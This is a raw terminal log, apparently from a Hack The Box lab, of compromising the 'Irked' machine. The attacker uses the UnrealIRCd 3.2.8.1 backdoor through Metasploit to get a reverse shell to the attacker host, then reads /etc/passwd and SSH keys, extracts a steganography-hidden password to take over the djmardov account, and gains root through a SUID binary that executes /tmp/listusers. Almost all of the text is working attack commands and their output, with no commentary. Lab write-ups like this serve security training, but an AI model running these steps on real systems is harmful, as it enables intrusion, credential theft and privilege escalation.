@@ -1,0 +1,537 @@
+root@kali:~/HTB/Irked# python /usr/share/exploitdb/exploits/linux/remote/45210.py 10.10.10.117 root
+[+] Valid username
+
+
+* Looking up 10.10.10.117
+* Connecting to 10.10.10.117 (10.10.10.117:6697)
+* Connected. Now logging in.
+* *** Looking up your hostname...
+* *** Couldn't resolve your hostname; using your IP address instead
+* You have not registered
+* Welcome to the ROXnet IRC Network test!test4@10.10.13.227
+* Your host is irked.htb, running version Unreal3.2.8.1
+* This server was created Mon May 14 2018 at 13:12:50 EDT
+* irked.htb Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
+* UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 :are supported by this server
+* WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=ROXnet CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&@%+ :are supported by this server
+* EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP :are supported by this server
+* There are 1 users and 1 invisible on 1 servers
+* 1 :unknown connection(s)
+* I have 2 clients and 0 servers
+* Current Local Users: 2  Max: 2
+* Current Global Users: 2  Max: 2
+* MOTD File is missing
+* test sets mode +i on test
+* test sets mode +w on test
+* test sets mode +x on test
+
+
+
+root@kali:~/HTB/Irked# searchsploit unrealirc
+--------------------------------------- ----------------------------------------
+ Exploit Title                         |  Path
+                                       | (/usr/share/exploitdb/)
+--------------------------------------- ----------------------------------------
+UnrealIRCd 3.2.8.1 - Backdoor Command  | exploits/linux/remote/16922.rb
+UnrealIRCd 3.2.8.1 - Local Configurati | exploits/windows/dos/18011.txt
+UnrealIRCd 3.2.8.1 - Remote Downloader | exploits/linux/remote/13853.pl
+UnrealIRCd 3.x - Remote Denial of Serv | exploits/windows/dos/27407.pl
+--------------------------------------- ----------------------------------------
+Shellcodes: No Result
+
+
+
+
+
+msf5 > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhosts 10.10.10.117
+rhosts => 10.10.10.117
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rport 6697
+rport => 6697
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set lhost 10.10.13.227
+lhost => 10.10.13.227
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set lport 4444
+lport => 4444
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+
+[*] Started reverse TCP double handler on 10.10.13.227:4444 
+[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
+    :irked.htb NOTICE AUTH :*** Looking up your hostname...
+[*] 10.10.10.117:6697 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo GCkviuh1gmjcyyDd;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Matching...
+[*] B is input...
+[*] Command shell session 1 opened (10.10.13.227:4444 -> 10.10.10.117:54036) at 2019-03-19 23:23:03 +0100
+
+
+shell
+[*] Trying to find binary(python) on target machine
+[*] Found python at /usr/bin/python
+[*] Using `python` to pop up an interactive shell
+
+
+
+
+
+$ cat /etc/issue
+cat /etc/issue
+Debian GNU/Linux 8 \n \l
+
+$ cat /etc/*-release
+cat /etc/*-release
+PRETTY_NAME="Debian GNU/Linux 8 (jessie)"
+NAME="Debian GNU/Linux"
+VERSION_ID="8"
+VERSION="8 (jessie)"
+ID=debian
+HOME_URL="http://www.debian.org/"
+SUPPORT_URL="http://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+$ cat /etc/profile
+cat /etc/profile
+# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
+# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).
+
+if [ "`id -u`" -eq 0 ]; then
+  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+else
+  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
+fi
+export PATH
+
+if [ "$PS1" ]; then
+  if [ "$BASH" ] && [ "$BASH" != "/bin/sh" ]; then
+    # The file bash.bashrc already sets the default PS1.
+    # PS1='\h:\w\$ '
+    if [ -f /etc/bash.bashrc ]; then
+      . /etc/bash.bashrc
+    fi
+  else
+    if [ "`id -u`" -eq 0 ]; then
+      PS1='# '
+    else
+      PS1='$ '
+    fi
+  fi
+fi
+
+if [ -d /etc/profile.d ]; then
+  for i in /etc/profile.d/*.sh; do
+    if [ -r $i ]; then
+      . $i
+    fi
+  done
+  unset i
+fi
+$ cat /etc/bashrc
+cat /etc/bashrc
+cat: /etc/bashrc: No such file or directory
+$ cat ~/.bash_profile
+cat ~/.bash_profile
+cat: /home/ircd/.bash_profile: No such file or directory
+$ cat ~/.bashrc
+cat ~/.bashrc
+$ lpstat -a
+lpstat -a
+lpstat: No destinations added.
+$ ps aux | grep root
+ps aux | grep root
+root         1  0.0  0.2  22940  4300 ?        Ss   18:02   0:01 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    18:02   0:00 [kthreadd]
+root         3  0.4  0.0      0     0 ?        S    18:02   0:16 [ksoftirqd/0]
+root         5  0.0  0.0      0     0 ?        S<   18:02   0:00 [kworker/0:0H]
+root         7  0.1  0.0      0     0 ?        S    18:02   0:05 [rcu_sched]
+root         8  0.0  0.0      0     0 ?        S    18:02   0:00 [rcu_bh]
+root         9  0.0  0.0      0     0 ?        S    18:02   0:00 [migration/0]
+root        10  0.0  0.0      0     0 ?        S    18:02   0:00 [watchdog/0]
+root        11  0.0  0.0      0     0 ?        S<   18:02   0:00 [khelper]
+root        12  0.0  0.0      0     0 ?        S    18:02   0:00 [kdevtmpfs]
+root        13  0.0  0.0      0     0 ?        S<   18:02   0:00 [netns]
+root        14  0.0  0.0      0     0 ?        S    18:02   0:00 [khungtaskd]
+root        15  0.0  0.0      0     0 ?        S<   18:02   0:00 [writeback]
+root        16  0.0  0.0      0     0 ?        SN   18:02   0:00 [ksmd]
+root        17  0.0  0.0      0     0 ?        SN   18:02   0:00 [khugepaged]
+root        18  0.0  0.0      0     0 ?        S<   18:02   0:00 [crypto]
+root        19  0.0  0.0      0     0 ?        S<   18:02   0:00 [kintegrityd]
+root        20  0.0  0.0      0     0 ?        S<   18:02   0:00 [bioset]
+root        21  0.0  0.0      0     0 ?        S<   18:02   0:00 [kblockd]
+root        23  0.0  0.0      0     0 ?        S    18:02   0:00 [kswapd0]
+root        24  0.0  0.0      0     0 ?        S<   18:02   0:00 [vmstat]
+root        25  0.0  0.0      0     0 ?        S    18:02   0:00 [fsnotify_mark]
+root        31  0.0  0.0      0     0 ?        S<   18:02   0:00 [kthrotld]
+root        32  0.0  0.0      0     0 ?        S<   18:02   0:00 [ipv6_addrconf]
+root        33  0.0  0.0      0     0 ?        S<   18:02   0:00 [deferwq]
+root        67  0.0  0.0      0     0 ?        S<   18:02   0:00 [mpt_poll_0]
+root        68  0.0  0.0      0     0 ?        S    18:02   0:00 [khubd]
+root        69  0.0  0.0      0     0 ?        S<   18:02   0:00 [ata_sff]
+root        70  0.0  0.0      0     0 ?        S<   18:02   0:00 [mpt/0]
+root        71  0.0  0.0      0     0 ?        S<   18:02   0:00 [kpsmoused]
+root        74  0.0  0.0      0     0 ?        S    18:02   0:00 [scsi_eh_0]
+root        75  0.0  0.0      0     0 ?        S<   18:02   0:00 [scsi_tmf_0]
+root        76  0.0  0.0      0     0 ?        S    18:02   0:00 [scsi_eh_1]
+root        77  0.0  0.0      0     0 ?        S    18:02   0:00 [kworker/u2:2]
+root        79  0.0  0.0      0     0 ?        S<   18:02   0:00 [scsi_tmf_1]
+root        80  0.0  0.0      0     0 ?        S    18:02   0:00 [scsi_eh_2]
+root        81  0.0  0.0      0     0 ?        S<   18:02   0:00 [scsi_tmf_2]
+root        84  0.0  0.0      0     0 ?        S<   18:02   0:00 [kworker/0:1H]
+root       106  0.0  0.0      0     0 ?        S    18:02   0:00 [jbd2/sda1-8]
+root       107  0.0  0.0      0     0 ?        S<   18:02   0:00 [ext4-rsv-conver]
+root       139  0.0  0.0      0     0 ?        S    18:02   0:00 [kauditd]
+root       142  0.0  0.1  12904  3732 ?        Ss   18:02   0:00 /lib/systemd/systemd-udevd
+root       143  0.0  0.1   9376  2816 ?        Ss   18:02   0:01 /lib/systemd/systemd-journald
+root       210  0.0  0.0      0     0 ?        S<   18:02   0:00 [ttm_swap]
+root       457  0.0  0.1   4444  2652 ?        Ss   18:02   0:00 /sbin/rpcbind -w
+root       472  0.0  0.0      0     0 ?        S<   18:02   0:00 [rpciod]
+root       474  0.0  0.0      0     0 ?        S<   18:02   0:00 [nfsiod]
+root       481  0.0  0.0   2924   172 ?        Ss   18:02   0:00 /usr/sbin/rpc.idmapd
+root       483  0.0  0.2  36500  5780 ?        Ssl  18:02   0:00 /usr/lib/accountsservice/accounts-daemon
+root       485  0.0  0.5  55520 11912 ?        Ssl  
+
+18:02   0:00 /usr/sbin/NetworkManager --no-daemon
+root       486  0.1  0.3  45436  6724 ?        Ssl  18:02   0:04 /usr/bin/vmtoolsd
+root       487  0.0  0.1  31100  3252 ?        Ssl  18:02   0:00 /usr/sbin/rsyslogd -n
+root       488  0.0  0.3  40052  7420 ?        Ssl  18:02   0:00 /usr/sbin/ModemManager
+root       494  0.0  0.1   5016  2656 ?        Ss   18:02   0:00 /usr/sbin/cron -f
+avahi      497  0.0  0.0   3564   224 ?        S    18:02   0:00 avahi-daemon: chroot helper
+root       514  0.0  0.1   3768  2816 ?        Ss   18:02   0:00 /lib/systemd/systemd-logind
+root       531  0.0  0.0      0     0 ?        S<   18:02   0:00 [cfg80211]
+root       537  0.0  0.2  10024  4728 ?        Ss   18:02   0:00 /usr/sbin/cups-browsed
+root       538  0.0  0.0   2200  1604 ?        Ss   18:02   0:00 /usr/sbin/acpid
+root       544  0.0  0.0   2180  1424 ?        Ss   18:02   0:00 /usr/sbin/minissdpd -i 0.0.0.0
+root       548  0.0  0.2   8112  4836 ?        Ss   18:02   0:00 /usr/sbin/sshd -D
+root       566  0.0  0.3  36344  6852 ?        Ssl  18:02   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root       619  0.0  0.3  54952  7036 ?        Ssl  18:02   0:00 /usr/sbin/gdm3
+root       642  0.0  1.0  68536 21060 tty7     Ss+  18:02   0:00 /usr/bin/Xorg :0 -novtswitch -background none -noreset -verbose 3 -auth /var/run/gdm3/auth-for-Debian-gdm-Nj445p/database -seat seat0 -nolisten tcp vt7
+root       732  0.0  0.2   6476  4836 ?        Ss   18:02   0:00 /usr/sbin/apache2 -k start
+root       919  0.0  0.3  29580  6800 ?        Sl   18:02   0:00 gdm-session-worker [pam/gdm-launch-environment]
+root       960  0.0  0.3  41644  7828 ?        Ssl  18:02   0:00 /usr/lib/upower/upowerd
+root       974  0.0  0.0   4180  1852 tty1     Ss+  18:02   0:00 /sbin/agetty --noclear tty1 linux
+root      1023  0.0  0.2   7664  4232 ?        Ss   18:02   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
+root      1026  0.0  0.4  42988  9620 ?        Ssl  18:02   0:00 /usr/lib/packagekit/packagekitd
+root      1097  0.0  0.2  11416  6128 ?        Ss   18:06   0:00 sshd: djmardov [priv]
+root      1340  0.0  0.2  11900  6000 ?        Ss   18:07   0:00 /usr/sbin/cupsd -f
+root      1760  0.0  0.2  11416  6048 ?        Ss   18:19   0:00 sshd: djmardov [priv]
+root     12431  0.0  0.2  11416  5864 ?        Ss   18:54   0:00 sshd: djmardov [priv]
+root     12437  0.0  0.0      0     0 ?        S    18:54   0:00 [kworker/u2:1]
+root     12448  0.0  0.2  11416  5976 ?        Ss   18:55   0:00 sshd: djmardov [priv]
+root     12686  0.0  0.0      0     0 ?        S    18:57   0:00 [kworker/0:2]
+root     13061  0.0  0.0      0     0 ?        S    19:02   0:00 [kworker/0:1]
+root     13114  0.0  0.2  11416  5892 ?        Ss   19:03   0:00 sshd: djmardov [priv]
+root     14273  0.0  0.0      0     0 ?        S    19:07   0:00 [kworker/0:0]
+root     14308  0.3  0.2   9516  5008 ?        Ss   19:07   0:00 sshd: [accepted]    
+ircd     14314  0.0  0.1   4564  2160 pts/11   S+   19:07   0:00 grep root
+$ 
+$ 
+$ ps -ef | grep root
+ps -ef | grep root
+root         1     0  0 18:02 ?        00:00:01 /sbin/init
+root         2     0  0 18:02 ?        00:00:00 [kthreadd]
+root         3     2  0 18:02 ?        00:00:16 [ksoftirqd/0]
+root         5     2  0 18:02 ?        00:00:00 [kworker/0:0H]
+root         7     2  0 18:02 ?        00:00:05 [rcu_sched]
+root         8     2  0 18:02 ?        00:00:00 [rcu_bh]
+root         9     2  0 18:02 ?        00:00:00 [migration/0]
+root        10     2  0 18:02 ?        00:00:00 [watchdog/0]
+root        11     2  0 18:02 ?        00:00:00 [khelper]
+root        12     2  0 18:02 ?        00:00:00 [kdevtmpfs]
+root        13     2  0 18:02 ?        00:00:00 [netns]
+root        14     2  0 18:02 ?        00:00:00 [khungtaskd]
+root        15     2  0 18:02 ?        00:00:00 [writeback]
+root        16     2  0 18:02 ?        00:00:00 [ksmd]
+root        17     2  0 18:02 ?        00:00:00 [khugepaged]
+root        18     2  0 18:02 ?        00:00:00 [crypto]
+root        19     2  0 18:02 ?        00:00:00 [kintegrityd]
+root        20     2  0 18:02 ?        00:00:00 [bioset]
+root        21     2  0 18:02 ?        00:00:00 [kblockd]
+root        23     2  0 18:02 ?        00:00:00 [kswapd0]
+root        24     2  0 18:02 ?        00:00:00 [vmstat]
+root        25     2  0 18:02 ?        00:00:00 [fsnotify_mark]
+root        31     2  0 18:02 ?        00:00:00 [kthrotld]
+root        32     2  0 18:02 ?        00:00:00 [ipv6_addrconf]
+root        33     2  0 18:02 ?        00:00:00 [deferwq]
+root        67     2  0 18:02 ?        00:00:00 [mpt_poll_0]
+root        68     2  0 18:02 ?        00:00:00 [khubd]
+root        69     2  0 18:02 ?        00:00:00 [ata_sff]
+root        70     2  0 18:02 ?        00:00:00 [mpt/0]
+root        71     2  0 18:02 ?        00:00:00 [kpsmoused]
+root        74     2  0 18:02 ?        00:00:00 [scsi_eh_0]
+root        75     2  0 18:02 ?        00:00:00 [scsi_tmf_0]
+root        76     2  0 18:02 ?        00:00:00 [scsi_eh_1]
+root        77     2  0 18:02 ?        00:00:00 [kworker/u2:2]
+root        79     2  0 18:02 ?        00:00:00 [scsi_tmf_1]
+root        80     2  0 18:02 ?        00:00:00 [scsi_eh_2]
+root        81     2  0 18:02 ?        00:00:00 [scsi_tmf_2]
+root        84     2  0 18:02 ?        00:00:00 [kworker/0:1H]
+root       106     2  0 18:02 ?        00:00:00 [jbd2/sda1-8]
+root       107     2  0 18:02 ?        00:00:00 [ext4-rsv-conver]
+root       139     2  0 18:02 ?        00:00:00 [kauditd]
+root       142     1  0 18:02 ?        00:00:00 /lib/systemd/systemd-udevd
+root       143     1  0 18:02 ?        00:00:01 /lib/systemd/systemd-journald
+root       210     2  0 18:02 ?        00:00:00 [ttm_swap]
+root       457     1  0 18:02 ?        00:00:00 /sbin/rpcbind -w
+root       472     2  0 18:02 ?        00:00:00 [rpciod]
+root       474     2  0 18:02 ?        00:00:00 [nfsiod]
+root       481     1  0 18:02 ?        00:00:00 /usr/sbin/rpc.idmapd
+root       483     1  0 18:02 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
+root       485     1  0 18:02 ?        00:00:00 /usr/sbin/NetworkManager --no-daemon
+root       486     1  0 18:02 ?        00:00:04 /usr/bin/vmtoolsd
+root       487     1  0 18:02 ?        00:00:00 /usr/sbin/rsyslogd -n
+root       488     1  0 18:02 ?        00:00:00 /usr/sbin/ModemManager
+root       494     1  0 18:02 ?        00:00:00 /usr/sbin/cron -f
+avahi      497   489  0 18:02 ?        00:00:00 avahi-daemon: chroot helper
+root       514     1  0 18:02 ?        00:00:00 /lib/systemd/systemd-logind
+root       531     2  0 18:02 ?        00:00:00 [cfg80211]
+root       537     1  0 18:02 ?        00:00:00 /usr/sbin/cups-browsed
+root       538     1  0 18:02 ?        00:00:00 /usr/sbin/acpid
+root       544     1  0 18:02 ?        00:00:00 /usr/sbin/minissdpd -i 0.0.0.0
+root       548     1  0 18:02 ?        00:00:00 /usr/sbin/sshd -D
+root       566     1  0 18:02 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
+root       619     1  0 18:02 ?        00:00:00 /usr/sbin/gdm3
+root       642   619  0 18:02 tty7     00:00:00 /usr/bin/Xorg :0 -novtswitch -background none -noreset -verbose 3 -auth /var/run/gdm3/auth-for-Debian-gdm-Nj445p/database -seat seat0 -nolisten tcp vt7
+root       732     1  0 18:02 ?        00:00:00 /usr/sbin/apache2 -k start
+root       919   619  0 18:02 ?        00:00:00 gdm-session-worker [pam/gdm-launch-environment]
+root       960     1  0 18:02 ?        00:00:00 /usr/lib/upower/upowerd
+root       974     1  0 18:02 tty1     00:00:00 /sbin/agetty --noclear tty1 linux
+root      1023     1  0 18:02 ?        00:00:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
+root      1026     1  0 18:02 ?        00:00:00 /usr/lib/packagekit/packagekitd
+root      1097   548  0 18:06 ?        00:00:00 sshd: djmardov [priv]
+root      1340     1  0 18:07 ?        00:00:00 /usr/sbin/cupsd -f
+root      1760   548  0 18:19 ?        00:00:00 sshd: djmardov [priv]
+root     12431   548  0 18:54 ?        00:00:00 sshd: djmardov [priv]
+root     12437     2  0 18:54 ?        00:00:00 [kworker/u2:1]
+root     12448   548  0 18:55 ?        00:00:00 sshd: djmardov [priv]
+root     12686     2  0 18:57 ?        00:00:00 [kworker/0:2]
+root     13061     2  0 19:02 ?        00:00:00 [kworker/0:1]
+root     13114   548  0 19:03 ?        00:00:00 sshd: djmardov [priv]
+root     14273     2  0 19:07 ?        00:00:00 [kworker/0:0]
+root     14324   548  2 19:08 ?        00:00:00 sshd: [accepted]    
+ircd     14327 12859  0 19:08 pts/11   00:00:00 grep root
+$ su root
+su root
+Password: root
+
+su: Authentication failure
+$ 
+
+
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+messagebus:x:104:111::/var/run/dbus:/bin/false
+avahi:x:105:112:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+Debian-exim:x:106:114::/var/spool/exim4:/bin/false
+statd:x:107:65534::/var/lib/nfs:/bin/false
+colord:x:108:118:colord colour management daemon,,,:/var/lib/colord:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+geoclue:x:110:119::/var/lib/geoclue:/bin/false
+pulse:x:111:121:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
+sshd:x:113:65534::/var/run/sshd:/usr/sbin/nologin
+rtkit:x:114:123:RealtimeKit,,,:/proc:/bin/false
+saned:x:115:124::/var/lib/saned:/bin/false
+usbmux:x:116:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+hplip:x:117:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+Debian-gdm:x:118:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
+djmardov:x:1000:1000:djmardov,,,:/home/djmardov:/bin/bash
+ircd:x:1001:1001::/home/ircd:/bin/sh
+$ 
+
+
+
+$ cd /etc/ssh
+cd /etc/ssh
+$ ls
+ls
+moduli		  ssh_host_dsa_key.pub	  ssh_host_ed25519_key.pub
+ssh_config	  ssh_host_ecdsa_key	  ssh_host_rsa_key
+sshd_config	  ssh_host_ecdsa_key.pub  ssh_host_rsa_key.pub
+ssh_host_dsa_key  ssh_host_ed25519_key
+$ cd ssh_host_dsa_key
+cd ssh_host_dsa_key
+/bin/sh: 8: cd: can't cd to ssh_host_dsa_key
+$ cat ssh_host_dsa_key
+cat ssh_host_dsa_key
+cat: ssh_host_dsa_key: Permission denied
+$ cat ssh_host_dsa_key.pub
+cat ssh_host_dsa_key.pub
+ssh-dss AAAAB3NzaC1kc3MAAACBAI+wKAAyWgx/P7Pe78y6/80XVTd6QEv6t5ZIpdzKvS8qbkChLB7LC+/HVuxLshOUtac4oHr/IF9YBytBoaAte87fxF45o3HS9MflMA4511KTeNwc5QuhdHzqXX9ne0ypBAgFKECBUJqJ23Lp2S9KuYEYLzUhSdUEYqiZlcc65NspAAAAFQDwgf5Wh8QRu3zSvOIXTk+5g0eTKQAAAIBQuTzKnX3nNfflt++gnjAJ/dIRXW/KMPTNOSo730gLxMWVeId3geXDkiNCD/zo5XgMIQAWDXS+0t0hlsH1BfrDzeEbGSgYNpXoz42RSHKtx7pYLG/hbUr4836olHrxLkjXCFuYFo9fCDs2/QsAeuhCPgEDjLXItW9ibfFqLxyP2QAAAIAE5MCdrGmT8huPIxPI+bQWeQyKQI/lH32FDZb4xJBPrrqlk9wKWOa1fU2JZM0nrOkdnCPIjLeq9+Db5WyZU2u3rdU8aWLZy8zF9mXZxuW/T3yXAV5whYa4QwqaVaiEzjcgRouex0ev/u+y5vlIf4/SfAsiFQPzYKomDiBtByS9XA== root@irked
+$ cat ssh_host_ecdsa_key.pub
+cat ssh_host_ecdsa_key.pub
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFeZigS1PimiXXJSqDy2KTT4UEEphoLAk8/ftEXUq0ihDOFDrpgT0Y4vYgYPXboLlPBKBc0nVBmKD+6pvSwIEy8= root@irked
+$ cat ssh_host_ed25519_key.pub
+cat ssh_host_ed25519_key.pub
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6m+0iYo68rwVQDYDejkVvsvg22D8MN+bNWMUEOWrhj root@irked
+$ cat ssh_host_rsa_key.pub
+cat ssh_host_rsa_key.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDGASnp9kH4PwWZHx/V3aJjxLzjpiqc2FOyppTFp7/JFKcB9otDhh5kWgSrVDVijdsK95KcsEKC/R+HJ9/P0KPdf4hDvjJXB1H3Th5/83gy/TEJTDJG16zXtyR9lPdBYg4n5hhfFWO1PxM9m41XlEuNgiSYOr+uuEeLxzJb6ccq0VMnSvBd88FGnwpEoH1JYZyyTnnbwtBrXSz1tR5ZocJXU4DmI9pzTNkGFT+Q/K6V/sdF73KmMecatgcprIENgmVSaiKh9mb+4vEfWLIe0yZ97c2EdzF5255BalP3xHFAY0jROiBnUDSDlxyWMIcSymZPuE1N6Tu8nQ/pXxKvUar root@irked
+$ 
+
+
+
+
+$ locate user.txt
+locate user.txt
+/home/djmardov/Documents/user.txt
+/usr/share/doc/fontconfig/fontconfig-user.txt.gz
+$ cd /home/djmardov/Documents/
+cd /home/djmardov/Documents/
+$ ls -a
+ls -a
+.  ..  .backup	user.txt
+$ cat .backup
+cat .backup
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+$ 
+
+
+
+root@kali:~/HTB/Irked# ls
+irked.jpg  Irked.txt  nmap.txt
+root@kali:~/HTB/Irked# steghide extract -sf irked.jpg
+Enter passphrase: 
+wrote extracted data to "pass.txt".
+root@kali:~/HTB/Irked# ls
+irked.jpg  Irked.txt  nmap.txt  pass.txt
+root@kali:~/HTB/Irked# cat pass.txt
+Kab6h+m+bbp2J:HG
+
+
+
+
+
+$ locate user.txt
+locate user.txt
+/home/djmardov/Documents/user.txt
+/usr/share/doc/fontconfig/fontconfig-user.txt.gz
+$ su djmardov
+su djmardov
+Password: Kab6h+m+bbp2J:HG
+
+djmardov@irked:/home/ircd/Unreal3.2$ cat /home/djmardov/Documents/user.txt
+cat /home/djmardov/Documents/user.txt
+4a66a78b12dc0e661a59d3f5c0267a8e
+
+
+
+
+root@kali:~/HTB/Irked# ssh djmardov@htb.local
+djmardov@htb.local's password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Mar 20 14:59:10 2019 from 10.10.14.221
+djmardov@irked:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+/usr/sbin/exim4
+/usr/sbin/pppd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/X
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/viewuser
+/sbin/mount.nfs
+/bin/su
+/bin/mount
+/bin/fusermount
+/bin/ntfs-3g
+/bin/umount
+djmardov@irked:~$ 
+
+
+
+djmardov@irked:~$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2019-03-20 14:04 (:0)
+djmardov pts/0        2019-03-20 14:04 (10.10.14.221)
+djmardov pts/3        2019-03-20 14:05 (10.10.16.82)
+djmardov pts/6        2019-03-20 14:07 (10.10.12.129)
+djmardov pts/2        2019-03-20 14:17 (10.10.15.88)
+djmardov pts/11       2019-03-20 14:19 (10.10.16.38)
+djmardov pts/13       2019-03-20 15:03 (10.10.15.101)
+djmardov pts/16       2019-03-20 14:57 (10.10.15.88)
+djmardov pts/18       2019-03-20 14:59 (10.10.14.221)
+sh: 1: /tmp/listusers: not found
+djmardov@irked:~$ cat /tmp/listusers
+cat: /tmp/listusers: No such file or directory
+djmardov@irked:~$ echo "cat root.txt" > /tmp/listusers
+djmardov@irked:~$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2019-03-20 14:04 (:0)
+djmardov pts/0        2019-03-20 14:04 (10.10.14.221)
+djmardov pts/3        2019-03-20 14:05 (10.10.16.82)
+djmardov pts/6        2019-03-20 14:07 (10.10.12.129)
+djmardov pts/2        2019-03-20 14:17 (10.10.15.88)
+djmardov pts/11       2019-03-20 14:19 (10.10.16.38)
+djmardov pts/13       2019-03-20 15:03 (10.10.15.101)
+djmardov pts/16       2019-03-20 14:57 (10.10.15.88)
+djmardov pts/18       2019-03-20 14:59 (10.10.14.221)
+sh: 1: /tmp/listusers: Permission denied
+djmardov@irked:~$ /tmp/listusers
+-bash: /tmp/listusers: Permission denied
+djmardov@irked:~$ chmod 777 listusers
+chmod: cannot access ‘listusers’: No such file or directory
+djmardov@irked:~$ chmod 777 /tmp/listusers
+djmardov@irked:~$ cat /tmp/listusers
+cat root.txt
+djmardov@irked:~$ echo "cat /root/root.txt" > /tmp/listusers
+djmardov@irked:~$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2019-03-20 14:04 (:0)
+djmardov pts/0        2019-03-20 14:04 (10.10.14.221)
+djmardov pts/3        2019-03-20 14:05 (10.10.16.82)
+djmardov pts/6        2019-03-20 14:07 (10.10.12.129)
+djmardov pts/2        2019-03-20 14:17 (10.10.15.88)
+djmardov pts/11       2019-03-20 14:19 (10.10.16.38)
+djmardov pts/13       2019-03-20 15:03 (10.10.15.101)
+djmardov pts/16       2019-03-20 14:57 (10.10.15.88)
+djmardov pts/18       2019-03-20 14:59 (10.10.14.221)
+8d8e9e8be64654b6dccc3bff4522daf3
+djmardov@irked:~$ 
+
+
+
+netcat, wget, python present
+
